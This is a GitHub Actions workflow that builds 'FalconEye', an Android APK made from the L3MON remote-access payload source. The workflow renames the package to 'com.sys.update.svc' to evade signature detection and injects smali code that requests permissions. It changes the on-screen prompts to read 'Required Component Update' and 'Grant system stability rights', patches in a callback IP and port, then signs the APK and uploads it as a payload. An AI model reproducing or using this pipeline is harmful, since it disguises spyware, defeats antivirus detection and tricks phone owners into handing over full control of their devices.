name: Build FalconEye APK

on:
  push:
    branches: [ master, main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v3
        with:
          distribution: 'temurin'
          java-version: '8'

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y wget unzip
          wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O apktool.jar
          wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O sign.jar

      - name: Signature Obfuscation & Patching
        run: |
          OLD_PKG="com.etechd.l3mon"
          NEW_PKG="com.sys.update.svc"
          OLD_PATH="com/etechd/l3mon"
          NEW_PATH="com/sys/update/svc"

          echo "Renaming package from $OLD_PKG to $NEW_PKG..."
          
          OLD_PKG_ESC=$(echo "$OLD_PKG" | sed 's/\./\\./g')
          find payload_source -type f -exec sed -i "s|$OLD_PKG_ESC|$NEW_PKG|g" {} +
          find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +

          mkdir -p "payload_source/smali/$NEW_PATH"
          if [ -d "payload_source/smali/$OLD_PATH" ]; then
            mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
            rm -rf "payload_source/smali/com/etechd"
          fi

          # 1. Prepare Smali Snippets from Templates
          # We replace the placeholder in the templates with the actual NEW_PATH
          cp payload_source/permissions.smali.template permissions.smali
          sed -i "s|NEW_PATH_PLACEHOLDER|$NEW_PATH|g" permissions.smali
          
          cp payload_source/redirect.smali.template redirect.smali
          sed -i "s|NEW_PATH_PLACEHOLDER|$NEW_PATH|g" redirect.smali

          # 2. Inject Smali snippets using sed 'r' command
          sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/MainActivity;->setContentView(I)V|r permissions.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"
          sed -i "\|invoke-virtual {p0, v0, v1}, L$NEW_PATH/MainActivity;->requestPermissions|r redirect.smali" "payload_source/smali/$NEW_PATH/MainActivity.smali"

          # 3. Finalize Obfuscation
          sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"
          find payload_source -name "MainActivity.smali" -exec sed -i "s|Click 'Permissions'|Required Component Update|g" {} +
          find payload_source -name "MainActivity.smali" -exec sed -i "s|Enable ALL permissions|Grant system stability rights|g" {} +

          # 4. Dynamic IP/Port Patching
          chmod +x patch_payload.sh
          sed -i "s|payload_source/smali/com/etechd/l3mon/|payload_source/smali/$NEW_PATH/|g" patch_payload.sh
          ./patch_payload.sh

      - name: Build APK
        run: |
          java -jar apktool.jar b ./payload_source -o unsigned.apk
          java -jar sign.jar -a unsigned.apk --allowResign
          mkdir -p app/build/outputs/apk/debug/
          mv unsigned-aligned-debugSigned.apk app/build/outputs/apk/debug/FalconEye.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: FalconEye-Payload-APK
          path: app/build/outputs/apk/debug/FalconEye.apk
